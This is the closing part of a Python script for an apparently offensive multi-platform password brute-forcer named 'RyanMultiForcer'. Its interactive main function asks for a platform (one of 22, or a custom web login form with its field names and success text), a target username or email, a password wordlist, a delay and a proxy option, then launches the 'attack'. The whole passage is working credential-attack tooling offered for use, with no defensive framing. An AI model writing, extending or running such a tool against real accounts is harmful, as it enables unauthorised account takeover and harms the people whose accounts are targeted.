        print(f"\n{Back.RED}{Fore.WHITE}[!] Brute force complete. Password not found.{Style.RESET_ALL}")
        return False


# ═══════════════════════════════════════════════════════════════
#  INTERACTIVE MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    show_banner()

    # Platform selection
    plat_choice = input(f"{Fore.GREEN}[?] Select platform number [1-22]: {Style.RESET_ALL}").strip()
    while plat_choice not in PLATFORMS:
        print(f"{Fore.RED}[!] Invalid choice. Select 1-22.{Style.RESET_ALL}")
        plat_choice = input(f"{Fore.GREEN}[?] Select platform number [1-22]: {Style.RESET_ALL}").strip()

    platform = PLATFORMS[plat_choice]
    c = platform["color"]

    print(f"\n{c}{'─'*40}{Style.RESET_ALL}")
    print(f"{c}Selected: {platform['emoji']} {platform['name']}{Style.RESET_ALL}")
    print(f"{c}{'─'*40}{Style.RESET_ALL}\n")

    # Username
    if plat_choice == "22":
        print(f"{Fore.YELLOW}[!] Custom Web Form Mode{Style.RESET_ALL}")
        custom_url = input(f"{Fore.GREEN}[?] Enter login URL (POST endpoint): {Style.RESET_ALL}").strip()
        username_field = input(f"{Fore.GREEN}[?] Enter username field name: {Style.RESET_ALL}").strip()
        password_field = input(f"{Fore.GREEN}[?] Enter password field name: {Style.RESET_ALL}").strip()
        success_indicator = input(f"{Fore.GREEN}[?] Enter success indicator text in response: {Style.RESET_ALL}").strip()
        platform["login_url"] = custom_url
        # Store extra params
        platform["_custom_user_field"] = username_field
        platform["_custom_pass_field"] = password_field
        platform["_custom_success"] = success_indicator

    username = input(f"{Fore.GREEN}[?] Target username/email: {Style.RESET_ALL}").strip()
    if not username:
        print(f"{Fore.RED}[!] Username required{Style.RESET_ALL}")
        return

    # Wordlist
    default_wl = "passwords.txt"
    wordlist = input(f"{Fore.GREEN}[?] Password list path [{default_wl}]: {Style.RESET_ALL}").strip()
    if not wordlist:
        wordlist = default_wl

    # Delay
    dly = input(f"{Fore.GREEN}[?] Delay between attempts (seconds) [2]: {Style.RESET_ALL}").strip()
    try:
        delay = float(dly) if dly else 2.0
    except:
        delay = 2.0

    # Proxy
    proxy = input(f"{Fore.GREEN}[?] Use proxy? (y/n) [n]: {Style.RESET_ALL}").strip().lower()
    use_proxy = proxy == "y"

    print(f"\n{Fore.YELLOW}[!] Starting attack on {platform['name']} in 3s... Ctrl+C to abort{Style.RESET_ALL}")
    time.sleep(3)

    try:
        forcer = RyanMultiForcer(
            platform_id=plat_choice,
            username=username,
            wordlist=wordlist,
            delay=delay,
            use_proxy=use_proxy
        )
        forcer.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
